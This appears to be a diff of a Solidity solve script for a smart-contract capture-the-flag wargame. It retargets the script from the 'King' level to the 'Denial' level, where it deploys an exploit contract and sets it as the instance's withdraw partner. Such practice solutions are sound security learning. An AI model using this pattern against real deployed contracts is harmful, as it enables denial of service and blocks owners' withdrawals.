@@ -2,17 +2,17 @@
 pragma solidity ^0.8.13;
 
 import "./SolveLevelBase.sol";
-import "../src/interfaces/IKing.sol";
-import "../src/exploits/KingExploit.sol";
+import "../src/interfaces/IDenial.sol";
+import "../src/exploits/DenialExploit.sol";
 
-contract SolveLevel9 is SolveLevelBase {
+contract SolveLevel20 is SolveLevelBase {
     function getInstanceCreationData()
         internal
         pure
         override
         returns (address levelAddress, uint256 value)
     {
-        levelAddress = 0x27bC920e7C426500a0e7D63Bb037800A7288abC1;
+        levelAddress = 0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69;
         value = 0.001 ether;
     }
 
@@ -20,9 +20,9 @@ contract SolveLevel9 is SolveLevelBase {
         internal
         override
     {
-        IKing instance = IKing(payable(instanceAddress));
+        IDenial instance = IDenial(payable(instanceAddress));
+        DenialExploit exploit = new DenialExploit();
 
-        uint256 prize = instance.prize();
-        KingExploit exploit = new KingExploit{value: prize + 1}(instance);
+        instance.setWithdrawPartner(address(exploit));
     }
 }
